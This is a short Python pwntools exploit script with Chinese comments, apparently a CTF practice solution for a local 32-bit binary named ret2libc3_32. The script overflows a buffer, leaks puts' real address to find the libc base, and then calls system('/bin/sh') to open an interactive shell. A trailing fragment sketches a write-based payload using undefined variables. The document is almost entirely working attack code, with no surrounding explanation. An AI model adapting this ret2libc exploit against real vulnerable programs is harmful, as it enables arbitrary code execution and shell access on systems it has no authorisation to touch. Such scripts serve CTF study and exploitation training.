from pwn import *
e = ELF("./ret2libc3_32")
libc = ELF("/lib/i386-linux-gnu/libc.so.6") #确定libc库并解析
p = process("./ret2libc3_32")
puts_plt = e.plt['puts'] #puts函数的入口地址 
puts_got = e.got['puts']  #puts函数的got表地址
start_addr = e.symbols['_start'] #程序的起始地址
payload1 = b'a' * 112 + p32(puts_plt) + p32(start_addr) + p32(puts_got)
#attach(p, "b *0x0804868F")
#pause()
p.sendlineafter("Can you find it !?", payload1)
puts_real_addr = u32(p.recv()[0:4])  #接收puts的真实地址，占4个字节
#puts_real_addr = u64(p.recvuntil(b'\x7F')[-6:].ljust(8,b'\x00')) 64w位
print("puts_plt:{}, puts_got: {}, start_addr: {}".format(hex(puts_plt),hex(puts_got), hex(start_addr)))
print("puts_real_addr: ", hex(puts_real_addr)) 
libc_addr = puts_real_addr - libc.sym['puts'] #计算libc库的基地址
print(hex(libc_addr))
system_addr = libc_addr + libc.sym["system"] #计算system函数的真实地址
binsh_addr = libc_addr + next(libc.search(b"/bin/sh"))  #计算binsh字符串的真实地址
payload2 = b'a' * 112 + p32(system_addr) + b"aaaa" + p32(binsh_addr)
#pause()
p.sendline(payload2)
p.interactive()



# write的传参结构
payload = flat([bss_s_addr+0x200, write_plt,main_addr, 1, libc_start_main_got, 4])